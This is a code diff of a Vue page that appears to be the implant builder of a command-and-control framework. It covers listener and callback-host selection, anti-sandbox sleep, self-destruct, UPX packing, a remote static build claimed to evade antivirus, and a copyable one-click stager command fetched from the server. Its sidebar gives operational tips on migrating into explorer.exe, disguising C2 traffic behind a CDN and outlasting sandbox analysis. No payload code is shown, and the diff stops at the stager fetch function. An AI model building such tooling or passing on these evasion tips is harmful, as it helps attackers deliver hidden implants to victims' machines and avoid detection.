@@ -1,276 +1,404 @@
 <template>
-  <div class="payload-page-container">
-    <el-row :gutter="24">
-      <el-col :span="16">
-        <!-- Main Generation Panel -->
-        <div class="main-panel glass-panel mb-24">
-          <div class="panel-header">
-            <div class="header-info">
-              <h2 class="panel-title">资产同步 <span class="purple-text">受控端生成</span></h2>
-              <p class="panel-sub">分发多平台受控端载荷</p>
-            </div>
-            <el-tag type="info" class="premium-tag" effect="plain" round>CORE V3 STABLE</el-tag>
-          </div>
+  <div class="view-shell payload-shell">
+    <section class="payload-toolbar">
+      <div class="payload-toolbar__metrics">
+        <div class="chip">活跃监听器 {{ activeListeners.length }}</div>
+        <div class="chip">模式 {{ form.mode === 'build' ? '源码构建' : '模板补丁' }}</div>
+      </div>
+    </section>
 
-          <el-form :model="form" label-position="top" class="premium-form">
-            <!-- Platform Selection -->
-            <div class="form-section">
-              <label class="section-label">1. 目标平台指令架构</label>
-              <div class="platform-grid">
-                <div class="platform-group" :class="{ active: form.combinedType.startsWith('win') }">
-                  <div class="os-brand"><el-icon><Platform /></el-icon> Windows</div>
-                  <el-radio-group v-model="form.combinedType" size="small">
-                    <el-radio-button label="windows_amd64">X64 (标准)</el-radio-button>
-                    <el-radio-button label="windows_i386">X86 (旧版)</el-radio-button>
-                  </el-radio-group>
-                </div>
-                <div class="platform-group" :class="{ active: form.combinedType.startsWith('lin') }">
-                  <div class="os-brand"><el-icon><ChromeFilled /></el-icon> Linux</div>
-                  <el-radio-group v-model="form.combinedType" size="small">
-                    <el-radio-button label="linux_amd64">AMD64</el-radio-button>
-                    <el-radio-button label="linux_arm64">ARM64 / M1</el-radio-button>
-                  </el-radio-group>
-                </div>
+    <section class="payload-grid">
+      <article class="surface-card builder-card">
+        <div class="panel-head">
+          <div>
+            <span class="panel-kicker">Build Config</span>
+            <h3>载荷参数</h3>
+          </div>
+          <div class="chip">Core v3</div>
+        </div>
+
+        <el-form :model="form" label-position="top" class="payload-form">
+          <div class="section-block">
+            <div class="section-title">
+              <span class="section-index">01</span>
+              <div>
+                <strong>目标平台</strong>
+                <p>统一选择系统与架构，后续会自动同步下载文件名和 stager。</p>
               </div>
             </div>
 
-            <el-row :gutter="20">
-              <el-col :span="12">
-                <el-form-item label="2. 回连监听链路" required>
-                  <el-select 
-                    v-model="form.listenerId" 
-                    placeholder="选择活跃的通讯链路" 
-                    class="premium-select"
-                    @change="onListenerChange"
+            <div class="platform-grid">
+              <button
+                v-for="platform in platformGroups"
+                :key="platform.key"
+                type="button"
+                class="platform-card"
+                :class="{ 'platform-card--active': platform.active }"
+                @click="form.combinedType = platform.defaultValue"
+              >
+                <div class="platform-card__head">
+                  <div class="platform-card__icon">
+                    <el-icon><component :is="platform.icon" /></el-icon>
+                  </div>
+                  <div>
+                    <strong>{{ platform.label }}</strong>
+                    <span>{{ platform.caption }}</span>
+                  </div>
+                </div>
+
+                <el-radio-group v-model="form.combinedType" class="platform-options">
+                  <el-radio-button
+                    v-for="option in platform.options"
+                    :key="option.value"
+                    :label="option.value"
                   >
-                    <el-option 
-                      v-for="l in activeListeners" 
-                      :key="l.id" 
-                      :label="`${l.protocol} | Port: ${l.port}`" 
-                      :value="l.id" 
-                    />
-                  </el-select>
-                </el-form-item>
-              </el-col>
-              <el-col :span="12">
-                <el-form-item label="3. 回连路由地址" v-if="selectedListener?.protocol !== '正向TCP'">
-                  <el-input v-model="form.lhost" placeholder="C2 服务器公网 IP 或域名" prefix-icon="MapLocation" />
-                </el-form-item>
-              </el-col>
-            </el-row>
+                    {{ option.label }}
+                  </el-radio-button>
+                </el-radio-group>
+              </button>
+            </div>
+          </div>
 
-            <!-- Configuration Options -->
-            <div class="config-tabs-box glass-panel mt-10">
-              <div class="config-header">
-                 <div class="tab-btn" :class="{ active: form.mode === 'build' }" @click="form.mode = 'build'">源码级静态编译</div>
-                 <div class="tab-btn" :class="{ active: form.mode === 'patch' }" @click="form.mode = 'patch'">二进制补丁分发</div>
-              </div>
-              <div class="config-body">
-                 <div class="mode-info" v-if="form.mode === 'build'">
-                    <el-icon><Cpu /></el-icon>
-                    <span>调用远程 Rust 编译器。全静态链接，去除符号，免杀性极高（约 40s）。</span>
-                 </div>
-                 <div class="mode-info" v-else>
-                    <el-icon><Flashlight /></el-icon>
-                    <span>基于预编译模板。仅需毫秒级即可生成，适用于快速大规模投递。</span>
-                 </div>
+          <div class="section-block form-grid">
+            <el-form-item label="监听器" required>
+              <el-select
+                v-model="form.listenerId"
+                placeholder="选择一个运行中的监听器"
+                @change="onListenerChange"
+              >
+                <el-option
+                  v-for="listener in activeListeners"
+                  :key="listener.id"
+                  :label="`${listener.protocol} | 端口 ${listener.port}`"
+                  :value="listener.id"
+                />
+              </el-select>
+            </el-form-item>
 
-                 <el-divider class="mini-divider" />
+            <el-form-item
+              v-if="!isBindTcpListener(selectedListener?.protocol)"
+              label="回连地址"
+            >
+              <el-input
+                v-model="form.lhost"
+                placeholder="填写公网 IP 或域名"
+                :prefix-icon="MapLocation"
+              />
+            </el-form-item>
+          </div>
 
-                 <el-row :gutter="24">
-                   <el-col :span="8">
-                     <div class="toggle-item">
-                        <span class="label">自研休眠抗沙箱</span>
-                        <el-input-number v-model="form.sleepTime" :min="0" size="small" controls-position="right" />
-                     </div>
-                   </el-col>
-                   <el-col :span="8">
-                     <div class="toggle-item">
-                        <span class="label">运行后文件自毁</span>
-                        <el-switch v-model="form.autoDestruct" active-color="#7c3aed" />
-                     </div>
-                   </el-col>
-                   <el-col :span="8">
-                     <div class="toggle-item">
-                        <span class="label">UPX 壳极限压缩</span>
-                        <el-switch v-model="form.useUPX" active-color="#7c3aed" />
-                     </div>
-                   </el-col>
-                 </el-row>
+          <div class="section-block mode-panel">
+            <div class="section-title">
+              <span class="section-index">02</span>
+              <div>
+                <strong>生成方式</strong>
+                <p>按模板页风格拆分为两种模式，兼顾速度和对抗性。</p>
               </div>
             </div>
 
-            <!-- Generate Action -->
-            <div class="generate-footer mt-24">
-               <div class="target-chip">
-                  <span class="chip-label">生成目标:</span>
-                  <span class="chip-value">{{ previewUrl }}</span>
-               </div>
-               <el-button 
-                 type="primary" 
-                 class="huge-generate-btn" 
-                 :loading="loading" 
-                 @click="doGenerate"
-               >
-                 <el-icon v-if="!loading"><Download /></el-icon>
-                 编译并同步受控端
-               </el-button>
+            <div class="mode-switch">
+              <button
+                type="button"
+                class="mode-switch__item"
+                :class="{ 'mode-switch__item--active': form.mode === 'build' }"
+                @click="form.mode = 'build'"
+              >
+                <span>源码构建</span>
+                <small>完整编译，静态链接</small>
+              </button>
+              <button
+                type="button"
+                class="mode-switch__item"
+                :class="{ 'mode-switch__item--active': form.mode === 'patch' }"
+                @click="form.mode = 'patch'"
+              >
+                <span>模板补丁</span>
+                <small>秒级生成，适合快速投递</small>
+              </button>
             </div>
-          </el-form>
-        </div>
-      </el-col>
 
-      <el-col :span="8">
-        <!-- Quick Stager Column -->
-        <div class="stager-panel glass-panel mb-24">
-          <div class="panel-header mini">
-            <h3 class="panel-title small">一键注入指令</h3>
-          </div>
-          <div class="stager-content" v-loading="stagerLoading">
-            <div class="terminal-mini" v-if="stagerCommand">
-               <div class="term-dots"><span></span><span></span><span></span></div>
-               <pre><code>{{ stagerCommand }}</code></pre>
-               <el-button link class="copy-mini-btn" @click="copyStagerCommand">
-                 <el-icon><CopyDocument /></el-icon> 复制指令
-               </el-button>
+            <div class="mode-note">
+              <el-icon><Cpu /></el-icon>
+              <span>{{ modeDescription }}</span>
             </div>
-            <div class="stager-empty" v-else>
-               请在左侧选择平台与链路以生成快速上线脚本
+
+            <div class="option-grid">
+              <div class="option-card">
+                <span class="option-card__label">休眠时间</span>
+                <strong>{{ form.sleepTime }} 秒</strong>
+                <el-input-number v-model="form.sleepTime" :min="0" controls-position="right" />
+              </div>
+
+              <div class="option-card">
+                <span class="option-card__label">自动销毁</span>
+                <strong>{{ form.autoDestruct ? '已启用' : '未启用' }}</strong>
+                <el-switch v-model="form.autoDestruct" />
+              </div>
+
+              <div class="option-card">
+                <span class="option-card__label">UPX 压缩</span>
+                <strong>{{ form.useUPX ? '已启用' : '未启用' }}</strong>
+                <el-switch v-model="form.useUPX" />
+              </div>
             </div>
           </div>
-        </div>
 
-        <!-- OpSec Tips -->
-        <div class="tips-panel glass-panel">
-          <div class="panel-header mini">
-            <h3 class="panel-title small">OpSec 战术建议</h3>
-          </div>
-          <div class="tips-list">
-             <div class="tip-item">
-                <div class="tip-icon purple"><el-icon><Lock /></el-icon></div>
-                <div class="tip-text">上线后请优先执行 <b>migrate</b> 迁移受控端至系统核心进程（如 explorer.exe），此举可大幅提高生存率。</div>
-             </div>
-             <div class="tip-item">
-                <div class="tip-icon green"><el-icon><Connection /></el-icon></div>
-                <div class="tip-text">建议使用 <b>WebSocket</b> 协议配合 CDN 伪装，流量特征更接近正常办公请求。</div>
-             </div>
-             <div class="tip-item">
-                <div class="tip-icon blue"><el-icon><Share /></el-icon></div>
-                <div class="tip-text">休眠抗沙箱建议设置在 <b>10-30s</b>，足以绕过大多数自动化模拟分析器。</div>
-             </div>
-          </div>
-        </div>
-      </el-col>
-    </el-row>
+          <div class="build-preview">
+            <div class="build-preview__copy">
+              <span class="build-preview__label">回连预览</span>
+              <code class="build-preview__value">{{ previewUrl }}</code>
+            </div>
 
-    <!-- Build Terminal Dialog -->
-    <el-dialog 
-      v-model="showTerminal"
-      width="920px"
-      class="terminal-dialog-v2"
-      :show-close="false"
+            <el-button
+              type="primary"
+              class="generate-btn"
+              :loading="loading"
+              @click="doGenerate"
+            >
+              <el-icon v-if="!loading"><Download /></el-icon>
+              生成载荷
+            </el-button>
+          </div>
+        </el-form>
+      </article>
+
+      <aside class="section-stack payload-sidebar">
+        <article class="surface-card sidebar-card">
+          <div class="panel-head panel-head--tight">
+            <div>
+              <span class="panel-kicker">Quick Stager</span>
+              <h3>一键上线命令</h3>
+            </div>
+            <el-button link @click="fetchStagerCommand">
+              <el-icon><Refresh /></el-icon>
+            </el-button>
+          </div>
+
+          <div class="stager-state" v-loading="stagerLoading">
+            <template v-if="stagerCommand">
+              <div class="terminal-card">
+                <div class="terminal-card__dots">
+                  <span></span>
+                  <span></span>
+                  <span></span>
+                </div>
+                <code>{{ stagerCommand }}</code>
+              </div>
+              <div class="sidebar-actions">
+                <el-button class="sidebar-button" @click="copyStagerCommand">
+                  <el-icon><CopyDocument /></el-icon>
+                  复制命令
+                </el-button>
+              </div>
+            </template>
+
+            <div v-else class="empty-copy">
+              选择监听器和平台后，这里会自动生成对应的快速投递命令。
+            </div>
+          </div>
+        </article>
+
+        <article class="surface-card sidebar-card">
+          <div class="panel-head panel-head--tight">
+            <div>
+              <span class="panel-kicker">Operational Notes</span>
+              <h3>投递建议</h3>
+            </div>
+          </div>
+
+          <div class="tips-stack">
+            <div class="tip-row">
+              <div class="tip-row__icon">
+                <el-icon><Lock /></el-icon>
+              </div>
+              <p>建议优先选择 WebSocket 监听器，并通过域名或 CDN 出口伪装常规业务流量。</p>
+            </div>
+
+            <div class="tip-row">
+              <div class="tip-row__icon">
+                <el-icon><Share /></el-icon>
+              </div>
+              <p>如果需要快速大规模投递，优先使用模板补丁模式；需要更强对抗时切回源码构建。</p>
+            </div>
+
+            <div class="tip-row">
+              <div class="tip-row__icon">
+                <el-icon><Monitor /></el-icon>
+              </div>
+              <p>休眠时间建议保留在 10 到 30 秒区间，兼顾联机体验和自动化沙箱规避。</p>
+            </div>
+          </div>
+        </article>
+
+        <article class="surface-card sidebar-card">
+          <div class="panel-head panel-head--tight">
+            <div>
+              <span class="panel-kicker">Build Status</span>
+              <h3>构建状态</h3>
+            </div>
+            <div class="status-pill" v-if="currentTaskId">
+              {{ buildStatusText }}
+            </div>
+          </div>
+
+          <div class="status-grid">
+            <div class="status-cell">
+              <span>当前任务</span>
+              <strong class="mono">{{ currentTaskId ? currentTaskId.slice(0, 8) : '--------' }}</strong>
+            </div>
+            <div class="status-cell">
+              <span>阶段</span>
+              <strong>{{ stageLabel }}</strong>
+            </div>
+            <div class="status-cell">
+              <span>耗时</span>
+              <strong class="mono">{{ elapsedTime }}s</strong>
+            </div>
+          </div>
+
+          <div class="sidebar-actions" v-if="currentTaskId">
+            <el-button class="sidebar-button" @click="openBuildConsole">查看控制台</el-button>
+            <el-button class="sidebar-button" @click="exportLogs" :disabled="!logBuffer.length">导出日志</el-button>
+          </div>
+        </article>
+      </aside>
+    </section>
+
+    <el-dialog
+      v-model="terminalDialogVisible"
+      width="1040px"
+      class="build-dialog premium-dialog"
       destroy-on-close
       @opened="onTerminalOpened"
       @closed="onTerminalClosed"
     >
       <template #header>
-        <div class="term-dialog-header">
-           <div class="header-main">
-              <el-icon class="spin"><Cpu /></el-icon>
-              <span>正在构建独立受控端 ... ({{ currentTaskId.slice(0,8) }})</span>
-           </div>
-           <div class="header-actions">
-              <el-button link class="minimize-btn" @click="isMinimized = true"><el-icon><Minus /></el-icon></el-button>
-              <el-button link class="close-btn" @click="showTerminal = false"><el-icon><Close /></el-icon></el-button>
-           </div>
+        <div class="dialog-header">
+          <div>
+            <span class="panel-kicker">Build Console</span>
+            <h3>任务 {{ currentTaskId ? currentTaskId.slice(0, 8) : '--------' }}</h3>
+          </div>
+
+          <div class="dialog-actions">
+            <el-button circle plain @click="minimizeTerminal">
+              <el-icon><Minus /></el-icon>
+            </el-button>
+            <el-button circle plain @click="closeBuildSession">
+              <el-icon><Close /></el-icon>
+            </el-button>
+          </div>
         </div>
       </template>
-      <div class="terminal-body-v3">
-         <!-- Dashboard Header (IDE style) -->
-         <div class="build-stats-bar">
-            <div class="stat-item">
-               <div class="stat-icon"><el-icon><Cpu /></el-icon></div>
-               <div class="stat-info">
-                  <div class="stat-label">管道状态</div>
-                  <div class="stat-value" style="color: #10b981;">{{ buildStatusText }}</div>
-               </div>
-            </div>
-            <div class="stat-item">
-               <div class="stat-icon"><el-icon><Refresh /></el-icon></div>
-               <div class="stat-info">
-                  <div class="stat-label">已耗时长</div>
-                  <div class="stat-value" style="font-family: 'JetBrains Mono'; color: #f8fafc;">{{ elapsedTime }}s</div>
-               </div>
-            </div>
-            <div class="stat-item">
-               <div class="stat-icon"><el-icon><Monitor /></el-icon></div>
-               <div class="stat-info">
-                  <div class="stat-label">目标架构</div>
-                  <div class="stat-value" style="color: #38bdf8; font-family: 'JetBrains Mono'; font-size: 11px;">{{ form.combinedType }}</div>
-               </div>
-            </div>
-         </div>
 
-         <!-- Visual Pipeline Steps -->
-         <div class="build-pipeline">
-            <div class="pipe-step" :class="{ active: buildStage >= 1, done: buildStage > 1 }"><span>1</span> 预检环境</div>
-            <div class="pipe-line" :class="{ done: buildStage > 1 }"></div>
-            <div class="pipe-step" :class="{ active: buildStage >= 2, done: buildStage > 2 }"><span>2</span> 源码静态编译</div>
-            <div class="pipe-line" :class="{ done: buildStage > 2 }"></div>
-            <div class="pipe-step" :class="{ active: buildStage >= 3, done: buildStage > 3 }"><span>3</span> 安全壳压缩</div>
-         </div>
+      <div class="dialog-content">
+        <div class="status-grid status-grid--dialog">
+          <div class="status-cell">
+            <span>状态</span>
+            <strong>{{ buildStatusText }}</strong>
+          </div>
+          <div class="status-cell">
+            <span>阶段</span>
+            <strong>{{ stageLabel }}</strong>
+          </div>
+          <div class="status-cell">
+            <span>目标架构</span>
+            <strong class="mono">{{ form.combinedType }}</strong>
+          </div>
+          <div class="status-cell">
+            <span>耗时</span>
+            <strong class="mono">{{ elapsedTime }}s</strong>
+          </div>
+        </div>
 
-         <div class="term-toolbar-v3">
-            <div class="toolbar-left">
-               <span class="status-badge-v3">实时控制台输出 (Stdout)</span>
-            </div>
-            <div class="toolbar-right">
-               <el-button link class="tool-btn" @click="exportLogs">导出日志</el-button>
-               <el-button link class="tool-btn" @click="clearTerminal">清屏</el-button>
-            </div>
-         </div>
-         <div class="terminal-mount-box">
-            <div ref="terminalContainer" class="xterm-mount"></div>
-         </div>
+        <div class="pipeline">
+          <div
+            v-for="step in buildSteps"
+            :key="step.id"
+            class="pipeline-step"
+            :class="{
+              'pipeline-step--active': buildStage >= step.id,
+              'pipeline-step--done': buildStage > step.id
+            }"
+          >
+            <div class="pipeline-step__dot">{{ step.id }}</div>
+            <span>{{ step.label }}</span>
+          </div>
+        </div>
+
+        <div class="terminal-toolbar">
+          <span>实时构建输出</span>
+          <div class="terminal-toolbar__actions">
+            <el-button link @click="exportLogs">导出日志</el-button>
+            <el-button link @click="clearTerminal">清空缓冲</el-button>
+          </div>
+        </div>
+
+        <div class="terminal-wrap">
+          <div ref="terminalContainer" class="xterm-view"></div>
+        </div>
       </div>
     </el-dialog>
 
-    <!-- Floating Bubble -->
     <transition name="pop">
-      <div v-if="isMinimized && showTerminal" class="build-bubble-v2" @click="isMinimized = false">
-        <el-icon class="pulse"><Cpu /></el-icon>
-        <div class="bubble-info">
-          <div class="bubble-title">正在构建...</div>
-          <div class="bubble-id">任务 ID: {{ currentTaskId.slice(0,8) }}</div>
+      <button
+        v-if="isMinimized && currentTaskId"
+        type="button"
+        class="build-bubble"
+        @click="restoreTerminal"
+      >
+        <el-icon><Cpu /></el-icon>
+        <div>
+          <strong>{{ buildFinished ? '构建结果已返回' : '构建任务进行中' }}</strong>
+          <span>ID {{ currentTaskId.slice(0, 8) }} · {{ buildStatusText }}</span>
         </div>
-      </div>
+      </button>
     </transition>
   </div>
 </template>
 
 <script setup>
-import { ref, computed, onMounted, onUnmounted, watch } from 'vue'
-import { 
-  Plus, Monitor, Connection, Share, Lightning, Download, Refresh,
-  CopyDocument, MapLocation, Cpu, Lock, Setting, Minus, Close, 
-  Platform, ChromeFilled
+import { computed, nextTick, onMounted, onUnmounted, ref, watch } from 'vue'
+import {
+  ChromeFilled,
+  Close,
+  CopyDocument,
+  Cpu,
+  Download,
+  Lock,
+  MapLocation,
+  Minus,
+  Monitor,
+  Platform,
+  Refresh,
+  Share
 } from '@element-plus/icons-vue'
 import { ElMessage } from 'element-plus'
 import { getListeners, generateClient, request } from '@/api'
-import { Terminal as XTerm } from 'xterm'
-import { FitAddon } from 'xterm-addon-fit'
-import 'xterm/css/xterm.css'
+import { Terminal as XTerm } from '@xterm/xterm'
+import { FitAddon } from '@xterm/addon-fit'
+import '@xterm/xterm/css/xterm.css'
 
 const loading = ref(false)
 const activeListeners = ref([])
-const showTerminal = ref(false)
-const isMinimized = ref(false)
+const stagerLoading = ref(false)
+const stagerCommand = ref('')
+
 const currentTaskId = ref('')
+const terminalDialogVisible = ref(false)
+const isMinimized = ref(false)
+const buildStage = ref(1)
+const buildStatusText = ref('等待任务')
+const elapsedTime = ref(0)
 const logBuffer = ref([])
+const buildFinished = ref(false)
+
+const terminalContainer = ref(null)
+
 let xterm = null
 let fitAddon = null
 let ws = null
-const terminalContainer = ref(null)
+let buildTimer = null
+let resizeHandler = null
 
 const form = ref({
   combinedType: 'windows_amd64',
@@ -285,57 +413,301 @@ const form = ref({
   obfuscation_mode: 'none'
 })
 
-const stagerLoading = ref(false)
-const stagerCommand = ref('')
-
-watch([() => form.value.combinedType, () => form.value.listenerId], () => fetchStagerCommand())
-
-watch(isMinimized, (val) => {
-  if (val) {
-    document.body.classList.add('dialog-backdrop-hidden')
-  } else {
-    document.body.classList.remove('dialog-backdrop-hidden')
+const platformGroups = computed(() => [
+  {
+    key: 'windows',
+    label: 'Windows',
+    caption: '桌面与服务器环境',
+    icon: Platform,
+    defaultValue: 'windows_amd64',
+    active: form.value.combinedType.startsWith('windows'),
+    options: [
+      { label: 'X64 标准版', value: 'windows_amd64' },
+      { label: 'X86 兼容版', value: 'windows_i386' }
+    ]
+  },
+  {
+    key: 'linux',
+    label: 'Linux',
+    caption: '常规服务器与 ARM',
+    icon: ChromeFilled,
+    defaultValue: 'linux_amd64',
+    active: form.value.combinedType.startsWith('linux'),
+    options: [
+      { label: 'AMD64', value: 'linux_amd64' },
+      { label: 'ARM64 / M1', value: 'linux_arm64' }
+    ]
   }
-})
+])
 
-onMounted(async () => {
-    try {
-      const res = await getListeners()
-      activeListeners.value = res.data.filter(l => l.status === 'Running')
-      if (activeListeners.value.length > 0) {
-        form.value.listenerId = activeListeners.value[0].id
-        onListenerChange(form.value.listenerId)
-      }
-    } catch (e) { ElMessage.error('无法加载链路数据') }
-})
+const buildSteps = [
+  { id: 1, label: '环境检查' },
+  { id: 2, label: '核心编译' },
+  { id: 3, label: '压缩封装' }
+]
 
-onUnmounted(() => {
-    if (ws) ws.close()
-    if (xterm) xterm.dispose()
-})
+const selectedListener = computed(() =>
+  activeListeners.value.find((listener) => listener.id === form.value.listenerId)
+)
 
-const selectedListener = computed(() => activeListeners.value.find(l => l.id === form.value.listenerId))
+const isBindTcpListener = (protocol) => {
+  const value = String(protocol || '').toLowerCase()
+  return value === '正向tcp' || value === 'bind-tcp' || value === 'bind_tcp' || value.includes('bind')
+}
 
 const previewUrl = computed(() => {
   if (!selectedListener.value) return '---'
-  const proto = selectedListener.value.protocol.toLowerCase()
-  if (proto === 'websocket') return `ws://${form.value.lhost}:${selectedListener.value.port}/ws`
-  if (proto === '正向tcp') return `LOCAL_BIND : ${selectedListener.value.port}`
-  if (proto === 'dns') return `NS: ${selectedListener.value.ns_domain}`
+
+  const protocol = (selectedListener.value.protocol || '').toLowerCase()
+  if (protocol === 'websocket') return `ws://${form.value.lhost}:${selectedListener.value.port}/ws`
+  if (isBindTcpListener(protocol)) return `LOCAL_BIND:${selectedListener.value.port}`
+  if (protocol === 'dns') return `NS:${selectedListener.value.ns_domain}`
   return `${selectedListener.value.protocol}://${form.value.lhost}:${selectedListener.value.port}`
 })
 
-const onListenerChange = (id) => {
-  const l = activeListeners.value.find(item => item.id === id)
-  if (l) {
-    form.value.aesKey = l.encrypt_key || ''
-    form.value.encryption_salt = l.encryption_salt || ''
-    form.value.obfuscation_mode = l.obfuscate_mode || 'none'
+const modeDescription = computed(() => (
+  form.value.mode === 'build'
+    ? '调用远程 Rust 构建链路，适合需要完整静态编译与更高对抗性的交付场景。'
+    : '基于预编译模板快速打补丁，适合需要秒级生成和批量分发的场景。'
+))
+
+const stageLabel = computed(() => {
+  if (buildStage.value <= 1) return '环境检查'
+  if (buildStage.value === 2) return '核心编译'
+  if (buildStage.value === 3) return '压缩封装'
+  return buildFinished.value ? '已完成' : '处理中'
+})
+
+watch(
+  [() => form.value.combinedType, () => form.value.listenerId, () => form.value.lhost],
+  () => {
+    fetchStagerCommand()
+  }
+)
+
+const syncBuildTimer = (running) => {
+  window.clearInterval(buildTimer)
+  if (running) {
+    buildTimer = window.setInterval(() => {
+      elapsedTime.value += 1
+    }, 1000)
   }
 }
 
+const hydrateTerminal = () => {
+  if (!terminalContainer.value) return
+
+  xterm = new XTerm({
+    theme: {
+      background: '#0f0f10',
+      foreground: '#f2f2f2',
+      cursor: '#ffffff'
+    },
+    fontSize: 13,
+    fontFamily: 'Consolas, SFMono-Regular, monospace',
+    convertEol: true
+  })
+
+  fitAddon = new FitAddon()
+  xterm.loadAddon(fitAddon)
+  xterm.open(terminalContainer.value)
+  fitAddon.fit()
+
+  if (logBuffer.value.length) {
+    xterm.write(logBuffer.value.join('\r\n'))
+    xterm.write('\r\n')
+  }
+}
+
+const disposeTerminal = () => {
+  if (xterm) {
+    xterm.dispose()
+    xterm = null
+  }
+  fitAddon = null
+}
+
+const pushTerminalLog = (line) => {
+  logBuffer.value.push(line)
+  if (xterm) {
+    xterm.writeln(line)
+  }
+}
+
+const openBuildConsole = async () => {
+  if (!currentTaskId.value) return
+  isMinimized.value = false
+  terminalDialogVisible.value = true
+  await nextTick()
+}
+
+const restoreTerminal = () => {
+  openBuildConsole()
+}
+
+const minimizeTerminal = () => {
+  isMinimized.value = true
+  terminalDialogVisible.value = false
+}
+
+const closeBuildSocket = () => {
+  if (ws) {
+    ws.close()
+    ws = null
+  }
+}
+
+const closeBuildSession = () => {
+  terminalDialogVisible.value = false
+  isMinimized.value = false
+  closeBuildSocket()
+  syncBuildTimer(false)
+  disposeTerminal()
+  currentTaskId.value = ''
+  buildFinished.value = false
+  buildStatusText.value = '等待任务'
+  buildStage.value = 1
+  elapsedTime.value = 0
+}
+
+const onTerminalOpened = async () => {
+  await nextTick()
+  disposeTerminal()
+  hydrateTerminal()
+}
+
+const onTerminalClosed = () => {
+  disposeTerminal()
+  if (!isMinimized.value && buildFinished.value) {
+    closeBuildSocket()
+  }
+}
+
+const clearTerminal = () => {
+  logBuffer.value = []
+  xterm?.clear()
+}
+
+const exportLogs = () => {
+  if (!logBuffer.value.length) return
+  const blob = new Blob([logBuffer.value.join('\n')], { type: 'text/plain' })
+  const link = document.createElement('a')
+  link.href = URL.createObjectURL(blob)
+  link.download = `build_${currentTaskId.value ? currentTaskId.value.slice(0, 8) : 'logs'}.txt`
+  link.click()
+}
+
+const downloadArtifact = async (url) => {
+  const response = await request.get(url, { responseType: 'blob' })
+  const disposition = response.headers['content-disposition'] || ''
+  let filename = disposition.match(/filename\*?=['"]?([^;\n"']+)/i)?.[1] || url.split('/').pop()
+  if (filename.includes("''")) {
+    filename = decodeURIComponent(filename.replace(/.*''/, ''))
+  }
+  const link = document.createElement('a')
+  link.href = URL.createObjectURL(response.data)
+  link.download = filename
+  link.click()
+}
+
+const attachBuildSocket = () => {
+  const configuredBase = import.meta.env.VITE_API_BASE_URL || ''
+  let socketBase = `${window.location.protocol === 'https:' ? 'wss:' : 'ws:'}//${window.location.host}`
+
+  if (configuredBase && configuredBase !== '/') {
+    if (configuredBase.startsWith('http://') || configuredBase.startsWith('https://')) {
+      socketBase = configuredBase.replace(/^http/, 'ws')
+    } else {
+      const normalizedBase = configuredBase.startsWith('/') ? configuredBase : `/${configuredBase}`
+      socketBase = `${window.location.protocol === 'https:' ? 'wss:' : 'ws:'}//${window.location.host}${normalizedBase}`
+    }
+  }
+
+  const token = localStorage.getItem('cupcake_token')
+
+  closeBuildSocket()
+  ws = new WebSocket(`${socketBase}/api/build/logs/${currentTaskId.value}?token=${token}`)
+
+  ws.onmessage = async (event) => {
+    const payload = JSON.parse(event.data)
+
+    if (payload.type === 'log') {
+      pushTerminalLog(payload.content)
+      const text = String(payload.content).toLowerCase()
+      if (text.includes('cargo') || text.includes('compiling')) {
+        buildStage.value = 2
+        buildStatusText.value = '正在编译核心'
+      } else if (text.includes('upx')) {
+        buildStage.value = 3
+        buildStatusText.value = '正在压缩封装'
+      }
+      return
+    }
+
+    if (payload.type === 'success') {
+      pushTerminalLog(`[OK] ${payload.content}`)
+      buildStage.value = 4
+      buildStatusText.value = '构建成功'
+      buildFinished.value = true
+      syncBuildTimer(false)
+      await downloadArtifact(payload.content)
+      return
+    }
+
+    if (payload.type === 'error') {
+      pushTerminalLog(`[FAIL] ${payload.content}`)
+      buildStatusText.value = '构建失败'
+      buildFinished.value = true
+      syncBuildTimer(false)
+    }
+  }
+}
+
+const fetchListenersData = async () => {
+  try {
+    const response = await getListeners()
+    activeListeners.value = (response.data || []).filter((listener) => listener.status === 'Running')
+    if (!form.value.listenerId && activeListeners.value.length > 0) {
+      form.value.listenerId = activeListeners.value[0].id
+      onListenerChange(form.value.listenerId)
+    }
+  } catch {
+    ElMessage.error('无法加载监听器列表')
+  }
+}
+
+const onListenerChange = (id) => {
+  const listener = activeListeners.value.find((item) => item.id === id)
+  if (!listener) return
+  form.value.aesKey = listener.encrypt_key || ''
+  form.value.encryption_salt = listener.encryption_salt || ''
+  form.value.obfuscation_mode = listener.obfuscate_mode || 'none'
+}
+
+const handleDirectDownload = (response) => {
+  const blob = response.data
+  const disposition = response.headers['content-disposition'] || ''
+  let filename = disposition.match(/filename\*?=['"]?([^;\n"']+)/i)?.[1] || ''
+  if (filename.includes("''")) {
+    filename = decodeURIComponent(filename.replace(/.*''/, ''))
+  }
+  if (!filename) {
+    const os = form.value.combinedType.split('_')[0]
+    const ext = os === 'windows' ? '.exe' : ''
+    filename = `agent_${form.value.combinedType}${ext}`
+  }
+  const link = document.createElement('a')
+  link.href = URL.createObjectURL(blob)
+  link.download = filename
+  link.click()
+}
+
 const doGenerate = async () => {
-  if (!form.value.listenerId) return ElMessage.warning('请选择通信链路')
+  if (!form.value.listenerId) {
+    ElMessage.warning('请先选择监听器')
+    return
+  }
+
   loading.value = true
   try {
     const payload = {
@@ -351,229 +723,672 @@ const doGenerate = async () => {
       encryption_salt: form.value.encryption_salt,
       obfuscation_mode: form.value.obfuscation_mode
     }
+
     const response = await generateClient(payload)
     const blobData = response.data
-    if (blobData.type === 'application/json' || blobData.size < 2048) {
-        const text = await blobData.text()
-        const json = JSON.parse(text)
-        if (json.task_id) {
-            currentTaskId.value = json.task_id
-            showTerminal.value = true
-            return
-        }
-    }
-    handleDirectDownload(blobData)
-  } catch (e) { ElMessage.error('构造异常') }
-  finally { loading.value = false }
-}
 
-const handleDirectDownload = (blob) => {
-    const os = form.value.combinedType.split('_')[0]
-    const ext = os === 'windows' ? '.exe' : ''
-    const url = window.URL.createObjectURL(new Blob([blob]))
-    const a = document.createElement('a')
-    a.href = url
-    a.download = `agent_${form.value.combinedType}${ext}`
-    a.click()
+    if (blobData.type === 'application/json' || blobData.size < 2048) {
+      const text = await blobData.text()
+      const json = JSON.parse(text)
+      if (json.task_id) {
+        currentTaskId.value = json.task_id
+        logBuffer.value = []
+        elapsedTime.value = 0
+        buildStage.value = 1
+        buildStatusText.value = '正在准备构建环境'
+        buildFinished.value = false
+        terminalDialogVisible.value = true
+        isMinimized.value = false
+        syncBuildTimer(true)
+        attachBuildSocket()
+        return
+      }
+    }
+
+    handleDirectDownload(response)
+    ElMessage.success('载荷已生成并开始下载')
+  } catch {
+    ElMessage.error('生成失败，请检查监听器与构建配置')
+  } finally {
+    loading.value = false
+  }
 }
 
 const fetchStagerCommand = async () => {
